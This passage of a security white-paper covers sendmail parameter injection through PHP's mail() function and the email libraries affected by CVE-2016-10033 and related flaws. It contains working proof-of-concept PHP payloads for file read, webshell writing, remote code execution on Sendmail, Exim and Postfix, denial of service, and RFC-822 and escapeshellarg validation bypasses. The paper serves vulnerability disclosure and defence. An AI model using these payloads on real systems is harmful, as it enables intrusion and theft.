--[ 2 - The mail() function

mail() is a standard PHP function that is used as an interface for sending
e-mails from PHP scripts.
<http://php.net/manual/en/function.mail.php>

The function has the following definition:

# php --rf mail

Function [ <internal:standard> function mail ] {

  - Parameters [5] {
    Parameter #0 [ <required> $to ]
    Parameter #1 [ <required> $subject ]
    Parameter #2 [ <required> $message ]
    Parameter #3 [ <optional> $additional_headers ]
    Parameter #4 [ <optional> $additional_parameters ]
  }
}

From an attacker's perspective, the last (5th) argument is the
most interesting as it can allow injection of additional parameters to
/usr/bin/sendmail program installed on the system which is transparently
used by mail() to deliver the actual message.

--[ 2.1 - The 5th parameter ($additional_parameters)

The 5th parameter is optional. Many web applications use it however
to set envelope sender address / return-path with the parameter:

-f email@server-address.com

or alternatively:

-r email@server-address.com

The parameter with the address will be passed to /usr/sbin/sendmail, which
will use the email address to inform the receiving email server about the
origin/sender (through the 'MAIL FROM' SMTP command), for it to know where
to return an error message in case of a delivery failure.

--[ 2.2 - The /usr/sbin/sendmail interface invoked by the mail() function

/usr/sbin/sendmail program, as the name suggests, is an interface that
can be used for sending emails.
It is provided by the mail transfer agent (MTA) software installed on the
system (such as Sendmail, Postfix etc.).

When an email is sent with mail() by this simple PHP script:

<?php
	$to      = "john@localhost";
	$subject = "Simple Email";
	$headers = "From: mike@localhost";
	$body    = 'Body of the message';

	$sender  = "admin@localhost";

	mail($to, $subject, $body, $headers, "-f $sender");
?>

PHP will make the following execve() call to execute sendmail program:

execve("/bin/sh",
       ["sh", "-c", "/usr/sbin/sendmail -t -i  -f admin@localhost"],
       [/* 24 environment vars */])

and pass the following data to its STDIN:

To: john@localhost
Subject: Simple Email
X-PHP-Originating-Script: 0:simple-send.php
From: mike@localhost

Body of the message

The -t and -i parameters are added by PHP automatically.
Parameter -t makes sendmail extract headers from STDIN , and -i prevents
sendmail from treating '.' as the end of input.
The -f comes from the 5th parameter of the mail() function call.

What is interesting here is that the sendmail command gets executed with the
help of the system shell (sh) which creates some opportunities for command
injection attacks if the application passes untrusted input to the last
/ the 5th parameter of mail() function.

--[ 3 - Sendmail Command Injection via mail() and $additional_parameters

If an attacker was able to inject data to the 5th parameter of mail()
function, for example by means of the $sender variable set to an unfiltered
GET variable:

	$sender = $_GET['senders_email'];
	mail($to, $subject, $body, $headers, "-f $sender");

The attacker could inject arbitrary extra parameters to the
/usr/sbin/sendmail command by making the request to the PHP script:

<http://webserver/vulnerable.php?senders_email=attackers@email%20extra_data>

which would execute mail() as:

mail(..., "-f attackers@email extra_data");

which would lead to executing sendmail with the parameters:

/usr/sbin/sendmail t -i -f attackers@email extra_data

--[ 3.1 - escapeshellcmd() escaping

The important thing to note is that the mail() function performs command
escaping internally by essentially calling the :

escapeshellcmd($additional_parameters)

function, so that shell metacharacters will not work. For example,
setting

$senders_email GET variable to:

attacker@remote > /tmp/shell_injection

will not lead to the file creation of the shell_injection file as >
character will get escaped by the escapeshellcmd() and the sendmail
call will turn into:

/usr/sbin/sendmail t -i -f attacker@remote \> /tmp/shell_injection

thus preventing the special function of the '>' shell metacharacter.

--[ 3.2 - Sendmail Command Parameter Injection

The attacker can however inject additional command parametrs to the
sendmail command itself as the escapeshellcmd() function called by mail()
does not quote the $additional_parameters parameter by default.
It gives a programmer freedom to pass multiple arguments to sendmail,
but may introduce a vulnerability to unaware programmers.

A successful injection of additional parameters to sendmail, might
trigger additional functionality of the sendmail program itself.

For example, if the attacker managed to set $return variable to:

attackere@remote -LogFile /tmp/output_file

The sendmail program would be called as a shell command:

/usr/sbin/sendmail -t -i -f attackere@remote -LogFile /tmp/output_file

If the -LogFile was a valid argument for the sendmail interface installed
on the target machine, this could cause the program to write out a log file
into /tmp/output_file.

As it turns out Sendmail MTA has such a logging function in its
implementation of /usr/sbin/sendmail interface, which can be enabled by
-X parameter and could be used to save malicious code provided by the
attacker.

--[ 4 - Differences in the implementation of /usr/sbin/sendmail

As mentioned in the previous chapters, sendmail interface is provided by
the MTA email software (Sendmail, Postfix, Exim etc.) installed on the
system.

Although the basic functionality (such as -t -i -f parameters) remains the
same for compatibility reasons, other functions and parameters vary
greatly depending on the MTA installed.
For example, the aforementioned -X parameter that can be used for logging
is only implemented in the Sendmail MTA's version of /usr/sbin/sendmail
interface.
The others, simply implement it as a dummy switch, for compatibility
reasons or do not support it at all.

For this reason the man page for sendmail program varies depending on the
MTA installed on the system.

Here are a few examples of different man pages of sendmail command/interface:

Sendmail MTA:
<http://www.sendmail.org/~ca/email/man/sendmail.html>

Postfix MTA:
<http://www.postfix.org/mailq.1.html>

Exim MTA:
<https://linux.die.net/man/8/exim>

--[ 5 - Known exploitation vectors

The potential malicious usage of the 5th parameter of mail() involving
parameter injection to /usr/sbin/sendmail apears to be first uncovered by
Sogeti/ESEC company in the blog post released in 2011:

<http://esec-pentest.sogeti.com/posts/2011/11/03/using-mail-for-remote-code-execution.html>

The blog post revealed 2 exploitation vectors for Sendmail MTA that
may allow an attacker to * read/write to an arbitrary file and potentially
gain Remote Code Execution via -C and -X parameters to sendmail interface
provided by Sendmail MTA.

These 2 vectors only work on Sendmail MTA, and are presented below.

--[ 5.1 - Sendmail MTA: Arbitrary File Read with -C argument

From sendmail man page:

-Cfile
 Use alternate configuration file.

-X logfile
 Log all traffic in and out of mailers in the indicated log file.

These 2 parameters can be combined to cause sendmail to load an arbitrary
file as the config, and output the contents as a set of error messages
(due to unknown config lines).

For example, if attacker injected:

-C/etc/passwd -X/tmp/output.txt

as the 5th parameter of mail(), the following command would get executed:

/usr/sbin/sendmail -i -t -C/etc/passwd -X/tmp/output.txt

which would save the following data into /tmp/output.txt:

/etc/passwd: line 1: unknown configuration line
"root:x:0:0:root:/root:/bin/bash"
/etc/passwd: line 2: unknown configuration line
"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
/etc/passwd: line 3: unknown configuration line
"bin:x:2:2:bin:/bin:/usr/sbin/nologin"
/etc/passwd: line 4: unknown configuration line
"sys:x:3:3:sys:/dev:/usr/sbin/nologin"
/etc/passwd: line 5: unknown configuration line
"sync:x:4:65534:sync:/bin:/bin/sync"
/etc/passwd: line 6: unknown configuration line
"games:x:5:60:games:/usr/games:/usr/sbin/nologin"
...

For the attack to be useful to a remote attacker. The output file would
need to be placed in a writable directory under the document root where it
could be retrieved by the attacker through the web server.

--[ 5.2 - Sendmail MTA: Arbitrary File Write / Remote Code Execution

The -X parameter can also be used in combination with the:

-OQueueDirectory=/tmp/

parameter of Sendmail MTA's version of /usr/sbin/sendmail interface.

The parameter is described by the man page as:

       QueueDirectory=queuedir
              Select the directory in which to queue messages.

Attacker needs to select a world-writable directory to allow for saving
temporary files.

This will allow to successfully send a message passed to sendmail, as well
as save to the log file into an arbitrary file pointed by -X parameter.

Simple PoC:

<?php
	$sender = "attacker@anyhost -OQueueDirectory=/tmp/ -X/tmp/poc.php";
	$body   = '<?php phpinfo(); ?>';
	// ^ unfiltered vars, coming from attacker via GET, POST etc.

	$to = "john@localhost";
	$subject = "Simple Email";
	$headers = "From: mike@localhost";

	mail($to,$subject,$body,$headers, "-f $sender ");
?>

The PoC will save the PHP code within $body into the log file with this
resulting contents of /tmp/poc.php:

06272 <<< To: john@localhost
06272 <<< Subject: Simple Email
06272 <<< X-PHP-Originating-Script: 0:simplepoc.php
06272 <<< From: mike@localhost
06272 <<<
06272 <<< <?php phpinfo(); ?>
06272 <<< [EOF]

As the attacker might be able to control both the filename and contents,
this could potentially result in Arbitrary PHP code execution if the
attacker managed to save it under a writable directory within the document
root such as:

-X/var/www/html/webapp1/upload/backdoor.php

which they could then execute by a GET request:

<http://victim-server/webapp1/upload/backdoor.php>

For this to work, the upload directory must have enabled parsing/execution
of PHP files which sometimes gets turned off for security reasons by the
administrator or by the webapplication installer (via special rules in
.htaccess placed within the upload directory).

Also note that the output log file contains a lot of debug information
added by Sendmail MTA.

--[ 6 - New exploitation vectors/techniques discovered by the author

Sendmail MTA is rarely used due to its complexity and a history of
vulnerabilities.
It is no longer used by modern Linux distributions as the default MTA and
have been replaced with Postfix MTA on RedHat-based systems such as CentOS,
and with Exim MTA on Debian-based systems such as Ubuntu, Debian etc.

This makes it quite difficult to find Sendmail MTA in a real-world setups.
On systems where it is available, the exploitation could sometimes be
tricky due to the aforementioned limitations (correct webroot paths,
requirement for a php-executable/writable directory, mised-up payload).

As both of the known vectors presented in previous chapter require Sendmail
MTA to work, the author has performed a new research which lead to the
discovery of new exploitation vectors/techniques that may be used
on systems with modern MTAs such as Exim and Postfix.
The research has also produced a new vector for Sendmail MTA as well as
some improvements to the already-known vectors.

--[ 6.1 - All MTAs: Snatching emails / Performing Recon

One of the arguments that does not change across different MTAs is the
list of additional recipients which comes after the option list as per
this man page:

       sendmail [option ...] [recipient ...]

If attacker control the 5th parameter of mail() they can simply append
an extra recipient as shown below:

<?php
// Recon via mail() vector on all MTAs / sendmail versions
//
// Created by:
// Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

        $sender = "nobody@localhost attacker@anyhost-domain.com";
        // ^ unfiltered var, coming from attacker via GET, POST etc.

        $to = "support@localhost";
        $headers = "From: mike@localhost";
        $subject = "Support ticket: Remote Recon PoC";
	$body = "Show me what you got!";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

which would execute the command:

/usr/sbin/sendmail -t -i -f support@localhost attacker@anyhost-domain.com

and send an email similar to the following right into the attacker's
mailbox attacker@anyhost-domain.com:

Return-Path: <nobody@localhost>
Received: from localhost (localhost [127.0.0.1])
	by localhost (8.14.4/8.14.4/Debian-8+deb8u1) with ESMTP
id v04FSqQ5008197;
	Wed, 4 Jan 2017 10:28:52 -0500
Received: (from www-data@localhost)
	by localhost (8.14.4/8.14.4/Submit) id v04FSqEU008196
	for attacker@anyhost-domain.com; Wed, 4 Jan 2017 10:28:52 -0500
Date: Wed, 4 Jan 2017 10:28:52 -0500
Message-Id: <201701041528.v04FSqEU008196@localhost>
X-Authentication-Warning: localhost: www-data set sender to
nobody@localhost using -f
To: support@localhost
Subject: Support ticket: Remote Recon PoC
X-PHP-Originating-Script: 1000:recon-test.php
From: mike@localhost

This might reveal:

* version of operating system in use (Debian)

* server IPs

* the version of MTA in use (8.14.4 in this case, which is Sendmail MTA)

* the name of the script that sent the message (recon-test.php) which
could reveal the name of the email sending library/framework in use e.g:

X-PHP-Originating-Script: 0:class.phpmailer.php

If an application uses a dedicated email library such as PHPMailer,
Zend-mail etc. it might also append its version header.
For example:

X-Mailer: PHPMailer 5.2.17 ([https://github.com/PHPMailer/PHPMailer)](https://github.com/PHPMailer/PHPMailer%29)

Knowing the library in use attacker can adjust their attack to the
specific OS / MTA and PHP email library in use.

For example, the above version of PHPMailer is vulnerable to:

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

discovered by the author.

--[ 6.2 - Sendmail MTA: Improvements to the existing File Write vector

It is mistakenly believed that -X parameter requires a full path and
therefore an attacker needs to guess the webroot of a vulnerable website.

This is however not true as sendmail will also accept a relative path.
This allows the attacker to simply use the current working directory
of the remote vulnerable script as a reference.
If the remote script is running at the top level of the webroot,
the attacker may try to inject the following argument:

-X ./upload/backdoor.php

instead of

-X /var/www/html/webapp1/guessed-webroot/

Additionally, the somewhat long:

-OQueueDirectory=/tmp/

parameter can also be reduced to:

-oQ/tmp/

which might be useful if a web application limits the size of the $sender
string, as well as to bypass potential filtration of '=' character etc.

--[ 6.3 - SendmailMTA: Remote Code Execution via sendmail.cf config

In a secure deployment of a webapp, PHP script execution might be disabled
within the upload directory and the application might only allow upload
of static files such as text files, images etc.

A new vector was discovered that could allow RCE despite these limitations.

As sendmail interface allows to load a custom Sendmail MTA config file via

-C

argument to /usr/sbin/sendmail , an attacker could upload a malicious
config file as a static/text file via webapp's upload feature and use
it to force Sendmail to execute malicious code upon processing an
email message.

This could be achieved by making a copy of /etc/mail/sendmail.cf config
file and replacing the default Mlocal mail handler present at the end
of the file with a Sendmail config shown below (between the # lines):

<?php

/*
##########################################################################
# Sendmail MTA config vector executing /usr/bin/php that loads RCE code
# on stdin passed by mail() (e.g. within message body / subject etc.)
#
# Make a copy of a sendmail.cf config from /etc/mail/sendmail.cf
# and then append this config stanza/vector to the end of it.
# Such stanza can then be uploaded to the target webapp into upload/ dir
# for example with an example name of: sendmail_cf_exec
#
# Created by:
# Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

Mlocal,		P=/usr/bin/php, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL,
                R=EnvToL/HdrToL,
		T=DNS/RFC822/X-Unix,
		A=php -- $u $h ${client_addr}
##########################################################################
*/

        $sender = "attacker@anyhost -oQ/tmp/ -C./upload/sendmail_cf_exec
www-data@localhost";

        $body   = 'PHP RCE code: <?php system("touch /tmp/PWNED"); ?>';
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $to = "john@localhost";
        $subject = "Exim RCE PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");

?>

The $sender payload will use relative path to load the crafted Sendmail MTA
config file from (previously uploaded with the static file uploader)
upload/sendmail_cf_exec and use it to process the incoming email from
mail() function.
Sendmail MTA will then spawn /usr/bin/php process and process the
attacker's payload within the $body of the message.

Apart from the remote exploitation with static file upload scenario,
this vector could obviously also be very easily used in a shared hosting
environment.
In such a case, an attacker could easily use /tmp directory to prepare
the malicious config and then use mail() vulnerability in the target app
to load the config and gain code execution in the context of the victim
user.

--[ 6.4 - Exim MTA: Remote Code Execution

Exim MTA is the default MTA software installed with Debian-based systems
such as Ubuntu and Debian.

The /usr/sbin/sendmail interface provided by Exim4 has a fairly rich set
of functions.
The research uncovered -be option which can be very useful to attackers.

The man page states:

       -be       Run Exim in expansion testing mode. Exim discards its root
privilege, to prevent ordinary users from using this mode to read otherwise
inaccessible files.
                 If no arguments are given, Exim runs interactively,
prompting for lines of data. Otherwise, it processes each argument in turn.

The exim syntax/language provided by Exim was investigated for interesting
variables that could be expanded.
The exim syntax allows expanding standard variables such as: '$h_subject'
or '$recipients'.

Further research however uncovered ${run} which can be expanded to return
a result of a shell command.

For example, the following string:

${run{/bin/true}{yes}{no}}

would be expanded to 'yes' upon successful execution of /bin/true.

This was quickly turned into Arbitrary Remote Code Execution payload
which would execute arbitrary shell command passed within $body of the
message:

<?php
// RCE via mail() vector on Exim4 MTA
// Attacker's cmd is passed on STDIN by mail() within $body
// Discovered by:
// Dawid Golunski - @dawid_golunski - <https://legalhackers.com>

        $sender = "attacker@anyhost -be";
        $body   = 'Exec: ${run{/bin/bash -c "/usr/bin/id
>/tmp/id"}{yes}{no}}';
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $to = "john@localhost";
        $subject = "Exim RCE PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

This exploit vector seems the most powerful as it can allow attackers to
achieve instant RCE on systems with Exim MTA.
The code will get executed as soon as injected parameter/body of mail()
function gets passed to /usr/sbin/sendmail.
There is no need to write to any files and therefore writable directories
that are parsed by PHP engine are not required.

--[ 6.5 - Postfix MTA: Code Execution via malicious config

Postfix has proved to be more tricky during the research.

Nevertheless it was possible to determine a way that an attacker could use
to achieve code execution when the attacker and the target reside within
the same shared hosting environment.

Certain setups could also make it possible to carry out the attack
remotely.

Similarly to Sendmail MTA, the /usr/sbin/sendmail interface provided by Postfix
MTA has a -C switch that can be used to load a custom config.

sendmail will fail however as soon as the attacker's message message is
passed to postdrop command for proessing.
Postdrop will notice the -C config and stop further execution.

This could be bypassed however by creating a custom main.cf Postfix config
in /tmp/main.cf file with the following setting:

mailbox_command = /tmp/postfixfakebin/

The attacker could then place a malicious bash script/binary within the
postfix_fake_bin directory and inject the following parameter to the
/usr/sbin/sendmail interface provided by Postfix MTA, through mail()
parameter injection as shown in the PoC below:

<?php
/*
 Code Exec via mail() vector on Postfix MTA

 Attacker's shell cmds must be placed under postdrop file within a shared
 directory e.g. /tmp/postfixfakebin/postdrop

 A config line of:

 mailbox_command = /tmp/postfixfakebin/

 must also be added to a shared directory e.g. /tmp/main.cf

 Created by:
 Dawid Golunski - @dawid_golunski - <https://legalhackers.com>
*/
        $sender = "attacker@anyhost -C /tmp/";
        // ^ unfiltered vars, coming from attacker via GET, POST etc.

        $body   = 'Simple body, the payload is in postdrop anyway';
        $to = "john@localhost";
        $subject = "Postfic exec PoC";
        $headers = "From: mike@localhost";

        mail($to,$subject,$body,$headers, "-f $sender ");
?>

This scenario could potentially be exploited remotely if a target webapp
(vulnerable to mail() param injection) provides a file manager utitlity
that allows the attacker to create directories/files but does not
parse PHP files.

Another remote scenario could include a file uploader which lets users
upload ZIP files. A malicious zip could contain main.cf and postdrop
script/binary which gets extracted into a known location.

--[ 6.6 - Sendmail MTA: Denial of Service via File Read + File Append

The -C and -X parameters could be used to perform a Denial of Service
attack on the target by reading big known files such as web server logs
with -C option and appending them to a file in a writable directory
by the web server such as /tmp , /var/www/html/upload ,
/var/lib/php5/sessions etc. to exhaust disk space necessary for the correct
operation of the web application / the OS.

Although this specific example is limited to Sendmail MTA, this vector
likely affects more MTA servers and there likely are other parameters
supported by the remaining MTAs that could carry out a similar DoS attack.

--[ 7 - The param injection point & Real World vulnerability examples

The mail() parameter injection was deemed hardly exploitable / impractical
for many years as the 5th parameter of mail() has been thought to be
rarely exposed to malicious input outside of web application control panels
which are usually restricted to administrative users and therefore are
usually of little use to remote attackers.
Finding a mail() param injection vulnerability, would also not necessarily
guarantee a successful exploitation as it would depend on installed MTA on
the web server (its sendmail interface) and up until now the only option was
rarely used Sendmail MTA with the 2 vectors -X -C (File Write / Read) which
decreased the attack surface further.

For this reason, the new attack vectors presented in the previous chapter
could be very useful in exploitation of the real world new vulnerabilities
described further on and open more attack possibilities.

--[ 7.1 - Vulnerable email libraries (PHPMailer / Zend-mail / SwiftMailer)

Recently a set of mail() param injection vulnerabilities was exposed by the
author:

PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)

PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Zend Framework/zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)

The details can be seen in the respective advisories, however we can have a
quick look at the problem they all shared, on the example of PHPMailer.

--[ 7.2 - The sender injection via SetFrom() method of the PHP email libs

Similarly to the other email libraries, PHPMailer class uses PHP mail()
function as its default transport.

The transport was implemented using the mailSend() function:

    protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a
        //return-path header by the receiver
        if (!empty($this->Sender)) {
            $params = sprintf('-f%s', $this->Sender);
        }
...
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject,
$body, $header, $params);

as can be seen, it creates a $params variable that appends $this->Sender
property  to '-f ' string to create a sendmail parameter (Envelope Sender
/ MAIL FROM) that gets passed to the mail() function as the 5th parameter.

The internal $this->Sender property can be validated and set by calling
the setFrom() method of PHPMailer class. This looks as follows:

public function setFrom($address, $name = '', $auto = true)
{
$address = trim($address);
$name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
// Don't validate now addresses with IDN. Will be done in send().
if (($pos = strrpos($address, '@')) === false or
    (!$this->has8bitChars(substr($address, ++$pos)) or
!$this->idnSupported()) and
    !$this->validateAddress($address)) {
...

In theory, setFrom() should rarely be exposed to untrusted user input, and
even if it was, there is a validation function in place that validates
the email to be RFC 822 compliant so this should not be a problem.

The PHPMailer tutorial at:
<https://github.com/PHPMailer/PHPMailer/wiki/Tutorial>

shows a basic usage PHPMailer as:

<?php
	require 'PHPMailerAutoload.php';
	$mail = new PHPMailer;
	$mail->setFrom('from@example.com', 'Your Name');
	$mail->addAddress('myfriend@example.net', 'My Friend');
	$mail->Subject  = 'First PHPMailer Message';
	$mail->Body     = 'Hi! first e-mail from PHPMailer.';

	if(!$mail->send()) {
	  echo 'Message was not sent.';
	  echo 'Mailer error: ' . $mail->ErrorInfo;
	} else {
	  echo 'Message has been sent.';
}

Contrary to what the name might suggest, this setFrom() example should not
however be used for storing an address provided by visitors.

Unfortunatelly, due to the name of the function and the popularity of the
code snippet, many scripts use setFrom() to set the visitor's 'From' e-mail
address passed through a field in various Contact and Feedback forms.

Unaware that they should be using AddReplyTo() (which sets the
DATA/Reply-To header, as opposed to the MAIL FROM/Envelope Sender address)
instead.

Implementation with setFrom() will however achieve the result and the
Contact/Feedback form may work as expected, even though it does not conform
to the email best practice.

This would not make a severe security flaw , if it was not for the fact
that the untrusted email address set with setFrom() would end up as the
5th parameter to mail() function and the RFC validation could be bypassed.
This made it possible to inject arbitrary parameters to /usr/sbin/sendmail
and lead to a critical Remote Code Execution flaw that could be exploited
via a range of vectors presented in the previous chapter.

As mentioned, the other PHP libraries had a very similar flaw which was
later dubbed with a name - "PwnScriptum".

More details together with a demo of this vulnerability showing how it
could get exploited via a Contact form can be seen at:

<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

A limited exploit has also been shared at:
<https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>

--[ 7.3 - Other injection points / ways to exploit mail() vulnerabilities

The remaining real-world examples will be described in the next version of
this white-paper once the issues have been fixed by certain vendors that
are currently working on security patches.

--[ 8 - Bypass techniques

This chapter presents some bypass techniques that might come in handy to
bypass similar protections.

The next 2 were used to bypass protections offered by the PHP email libraries
discussed in the previous chapter.

--[ 8.1 - The beauty of RFC 3696 & RFC 822

The RFC 3696 / RFC 822 standards

<https://tools.ietf.org/html/rfc3696>
<https://www.ietf.org/rfc/rfc0822.txt>

emails to take the following forms:

      Abc\@def@example.com

      Fred\ Bloggs@example.com

      Joe.\\Blow@example.com

      "Abc@def"@example.com

      "Fred Bloggs"@example.com

The generosity of these standards allowed the author to construct a valid email
address that complies with the RFCs but is at the same time a malicious payload
for the 5th argument of mail():

"Attacker \" -Param2 -Param3"@test.com

when passed to a vulnerable PHP email library and then to mail() function, it
would cause sendmail to execute with the parameters:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Attacker could thus break out of the -f parameter context and inject additional
parameters (arg no. 4 and arg no. 5 in the example above).

--[ 8.2 - Bypassing escapeshellarg() applied on mail()

It seems intuitive that additional parameters passed to sendmail via the 5th
parameter of mail() function should be single quoted with escapeshellarg()
function which has been designed for this kind of purpose.

Unfortunatelly, it clashes with the internal command escaping performed
internally by the mail() function.

A good example of this is the CVE-2016-10033 vulnerability which turned
into a new vulnerability of CVE-2016-10045 , as the fix of this kind could
be bypassed due to the clashing and setting the Sender to:

$mail->SetFrom("\"Attacker\\' -Param2 -Param3\"@test.com", 'Client Name');

would result in the followig list of arguments passed to sendmail program:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-f\"Attacker\\\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com']

which again resulted in arbitrary parameters (arg 4 & 5) passed to
/usr/sbin/sendmail.

--[ 9 - Credits

This security white-paper has been written by:

Dawid Golunski ([@dawid_golunski](https://twitter.com/dawid_golunski))
<https://legalhackers.com>

dawid[at]legalhackers.com

Please add a link back to this paper if the information proved to
be useful to you.

--[ 10 - References

[0] <https://legalhackers.com/>
[1] <https://www.ietf.org/rfc/rfc2821.txt>
[2] <http://php.net/manual/en/function.mail.php>
[3] <http://www.sendmail.org/~ca/email/man/sendmail.html>
[4] <http://www.postfix.org/mailq.1.html>
[5] <https://linux.die.net/man/8/exim>
[6] <https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>
[7] <https://legalhackers.com/exploits/CVE-2016-10033/10045/10034/10074/PwnScriptum_RCE_exploit.py>
[8] <https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html>

--[ 11 - [ExploitBox - A Playground For Hackers](https://ExploitBox.io)

Interested in vulns/exploitation?

                        .;lc'
                    .,cdkkOOOko;.
                 .,lxxkkkkOOOO000Ol'
             .':oxxxxxkkkkOOOO0000KK0x:'
          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
     .dxxxxxdl;. .,               .. .;cdxxxxxx:
     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
             .':oxxxxxxxxx.ckkkkkkkkxl,.
                 .,cdxxxxx.ckkkkkxc.
                    .':odx.ckxl,.
                        .,.'.

 <https://ExploitBox.io>

 <https://twitter.com/Exploit_Box>

Subscribe to stay updated and be there for the launch.

--[ 12 - Disclaimer

The information contained within this advisory is supplied "as-is" with
no warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this
information.

--[ EOF

```

**COMING SOON**

[![](../assets/img/logo.png)](https://ExploitBox.io)


